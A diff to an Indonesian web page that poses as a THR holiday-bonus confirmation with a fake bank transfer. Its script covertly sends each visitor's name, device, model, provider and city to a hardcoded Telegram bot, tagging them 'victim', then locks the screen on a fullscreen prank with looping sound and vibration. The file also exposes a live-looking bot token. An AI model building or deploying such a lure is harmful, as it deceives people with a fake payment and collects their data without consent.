@@ -6,17 +6,22 @@
     <title>Konfirmasi Penerimaan THR 2026 🌙</title>
     <style>
         body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
-        #intro { margin-top: -50px; padding: 0 20px; }
+        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
         h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
         p { color: #166534; margin-top: 0; font-weight: bold; }
-        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 30px; width: 280px; }
-        input { width: 90%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 1rem; }
-        #envelope { width: 280px; cursor: pointer; transition: all 0.2s ease; z-index: 10; margin-top: 20px; }
+        
+        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 20px; width: 280px; z-index: 6; }
+        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; transition: 0.3s; }
+        input:focus { border-color: #15803d; }
+        
+        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; margin-top: 10px; }
         #envelope:active { transform: scale(0.9); }
+        
         #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; }
         #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
+        
         #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #15803d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -35,7 +40,7 @@
 
     <div id="loading-overlay">
         <div class="spinner"></div>
-        <p id="status-text" style="margin-top: 15px; font-weight: bold; color: #15803d;">Menghubungkan ke server bank...</p>
+        <p id="status-text" style="margin-top: 20px; font-weight: bold; color: #15803d;">Menghubungkan ke server bank...</p>
     </div>
 
     <div id="prank-screen" onclick="location.reload()">
@@ -48,41 +53,32 @@
         const loading = document.getElementById('loading-overlay');
         const statusText = document.getElementById('status-text');
         const prank = document.getElementById('prank-screen');
+        
+        // PRE-LOAD SUARA
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
+        prankSound.load();
 
-        // DATA TELEGRAM
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
 
-        async function kirimData(nama) {
+        async function kirimLog(nama) {
             const ua = navigator.userAgent;
-            let device = "Gak Kenal";
+            let device = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iPhone/iOS" : "PC");
+            const model = ua.match(/\(([^)]+)\)/) ? ua.match(/\(([^)]+)\)/)[1] : "Unknown Device";
+            
             let provider = "Mencari...";
             let kota = "Unknown";
 
-            // Deteksi OS
-            if (/android/i.test(ua)) device = "Android";
-            else if (/iPhone|iPad|iPod/i.test(ua)) device = "iPhone/iOS";
-            else if (/Windows/i.test(ua)) device = "Windows/PC";
-
-            // Ambil Seri HP (Model)
-            const model = ua.match(/\(([^)]+)\)/) ? ua.match(/\(([^)]+)\)/)[1] : "Unknown Device";
-
-            // Ambil Provider & Kota (HTTPS aman buat Vercel)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                provider = d.org || "Gak Ketemu";
+                provider = d.org || "Gagal Deteksi";
                 kota = d.city || "Unknown";
-            } catch (e) {
-                provider = "AdBlock Aktif";
-            }
+            } catch (e) { provider = "AdBlock/Error"; }
 
-            // Susun Pesan
-            const teks = `🎯 KORBAN BARU: ${nama}\n📱 OS: ${device}\n🔍 Seri: ${model}\n🌐 Provider: ${provider}\n📍 Kota: ${kota}\n⏰ Jam: ${new Date().toLocaleTimeString()}`;
-            
-            // Kirim ke Bot Tele
+            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${device}\n🔍 Seri: ${model}\n🌐 Provider: ${provider}\n📍 Kota: ${kota}\n⏰ Jam: ${new Date().toLocaleTimeString()}`;
             const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`;
+            
             fetch(url, { mode: 'no-cors' }).catch(() => {
                 const i = new Image(); i.src = url;
             });
@@ -91,28 +87,37 @@
         env.addEventListener('click', async () => {
             const nama = nameInput.value.trim();
             if (nama === "") {
-                alert("Harap masukkan nama untuk verifikasi saldo!");
+                alert("Masukkan nama dulu biar sistem bisa proses saldo!");
                 return;
             }
 
-            // Langsung kirim data pas klik amplop
-            kirimData(nama);
+            // PANCING SUARA BIAR GAK KENA BLOCK BROWSER
+            prankSound.play().then(() => {
+                prankSound.pause();
+                prankSound.currentTime = 0;
+            }).catch(() => {});
+
+            // Langsung kirim log ke Tele lo
+            kirimLog(nama);
 
             loading.style.display = 'flex';
             setTimeout(() => { statusText.innerText = "Memverifikasi data " + nama + "..."; }, 1000);
-            setTimeout(() => { statusText.innerText = "Proses transfer Rp 500.000..."; }, 2500);
+            setTimeout(() => { statusText.innerText = "Proses transfer saldo Rp 500.000..."; }, 2500);
 
             setTimeout(() => {
                 loading.style.display = 'none';
                 prank.style.display = 'flex';
-                prankSound.play().catch(() => {});
                 
-                if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
+                // MAININ SUARA
+                prankSound.loop = true;
+                prankSound.play().catch(e => console.log("Gagal play suara: ", e));
+                
+                if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
                 
                 const elem = document.documentElement;
                 if (elem.requestFullscreen) elem.requestFullscreen();
                 else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            }, 5000);
+            }, 5500);
         });
     </script>
 </body>
